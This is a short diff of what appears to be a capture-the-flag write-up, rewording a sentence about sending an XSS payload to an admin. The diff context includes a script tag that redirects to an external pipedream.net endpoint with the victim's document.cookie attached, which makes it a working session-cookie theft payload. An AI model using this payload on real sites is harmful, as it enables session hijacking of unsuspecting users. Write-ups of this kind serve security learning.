@@ -36,7 +36,7 @@ We finally discover the encryption is ROT-1 (ROT47(-48)). Let's try then to get 
 
 ... And we were right!!!
 
-Now that we finally have our PoC working, we need to send the payload to the admin in order to steal their session cookie. We can do this with the following payload, where `document.location=<our website>?cookie=:` is the listening server we control and `document.cookie` is the cookie we want to steal from the admin:  
+Now that we finally have our PoC working, we need to send the payload to the admin in order to steal their session cookie. We can do this with the following payload, where `document.location=<our website>?cookie=` is the listening server we control with a cookie request `document.cookie` is the cookie we want to steal from the admin:  
 
 ```
 <script>document.location="https://enx0ouxtov1d1z8.m.pipedream.net?cookie="+document.cookie;</script>
